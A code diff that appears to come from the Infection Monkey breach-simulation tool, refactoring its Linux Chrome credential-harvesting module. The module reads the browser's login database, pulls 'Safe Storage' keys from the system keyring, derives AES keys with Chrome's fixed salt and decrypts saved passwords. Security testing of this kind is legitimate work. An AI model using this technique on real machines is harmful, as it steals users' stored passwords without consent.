@@ -3,41 +3,23 @@ import logging
 import os
 import shutil
 import sqlite3
-from dataclasses import dataclass
-from hashlib import pbkdf2_hmac
 from itertools import chain
 from pathlib import Path, PurePath
-from typing import Iterator, Optional, Sequence, Set, Tuple
-
-import secretstorage
+from typing import Iterator, Optional
 
 from common.credentials import Credentials, Password, Username
 from common.types import Event
 from infection_monkey.utils.threading import interruptible_iter
 
+from .browser_credentials_database_path import BrowserCredentialsDatabasePath
 from .decrypt import AESModeOfOperationCBC, decrypt_v80
-
-
-@dataclass
-class EncryptionConfig:
-    iv: bytes
-    length: int
-    salt: bytes
-    iterations: int
+from .linux_keystore import get_decryption_keys_from_storage
 
 
 logger = logging.getLogger(__name__)
 
 AES_BLOCK_SIZE = 16
-ENC_CONFIG = EncryptionConfig(
-    iv=b" " * 16,
-    length=16,
-    salt=b"saltysalt",
-    iterations=1,
-)
-
-from .browser_credentials_database_path import BrowserCredentialsDatabasePath
-
+AES_INIT_VECTOR = b" " * 16
 DB_TEMP_PATH = "/tmp/chrome.db"
 DB_SQL_STATEMENT = "SELECT username_value,password_value FROM logins"
 
@@ -96,10 +78,10 @@ class LinuxCredentialsDatabaseProcessor:
 
     # TODO: Finish implementing this
     def _decrypt_password(self, password: str) -> str:
-        decryption_keys = [key for key in _get_decryption_keys_from_storage()]
+        decryption_keys = [key for key in get_decryption_keys_from_storage()]
         try:
             for key in decryption_keys:
-                return self._chrome_decrypt(password, key, init_vector=ENC_CONFIG.iv)
+                return self._chrome_decrypt(password, key, init_vector=AES_INIT_VECTOR)
 
         except Exception:
             logger.exception("Failed to decrypt password")
@@ -133,52 +115,3 @@ class LinuxCredentialsDatabaseProcessor:
         except Exception as err:
             logger.debug(err)
             return data
-
-
-# Utilities for connecting to chrome secret storage
-
-
-def _get_decryption_keys_from_storage() -> Iterator[bytes]:
-    used_session_labels: Set[str] = set()
-    for uid, session in _get_dbus_sessions():
-        bus = _connect_to_dbus_session(uid, session)
-        for collection in secretstorage.get_all_collections(bus):
-            yield from _get_secrets_from_collection(collection, used_session_labels)
-
-
-def _get_secrets_from_collection(
-    collection: secretstorage.collection.Collection,
-    used_session_labels: Set[str],
-) -> Iterator[bytes]:
-    if collection.is_locked():
-        return
-
-    label = collection.get_label()
-    if label in used_session_labels:
-        return
-    used_session_labels.add(label)
-
-    for item in collection.get_all_items():
-        if item.get_label().endswith("Safe Storage"):
-            yield _hash_decryption_key(item.get_secret())
-
-
-def _hash_decryption_key(key: bytes):
-    decryption_key = pbkdf2_hmac(
-        hash_name="sha1",
-        password=key,
-        salt=ENC_CONFIG.salt,
-        iterations=ENC_CONFIG.iterations,
-        dklen=ENC_CONFIG.length,
-    )
-    return decryption_key
-
-
-# TODO: Determine if we need to get the uid, DBUS_SESSION_BUS_ADDRESS from the environment
-def _get_dbus_sessions() -> Iterator[Tuple[str, str]]:
-    yield ("uid", "session")
-
-
-# TODO: Determine if we need to connect to an existing session by uid, DBUS_SESSION_BUS_ADDRESS
-def _connect_to_dbus_session(uid: str, session: str) -> secretstorage.dbus.SessionBus:
-    return secretstorage.dbus_init()
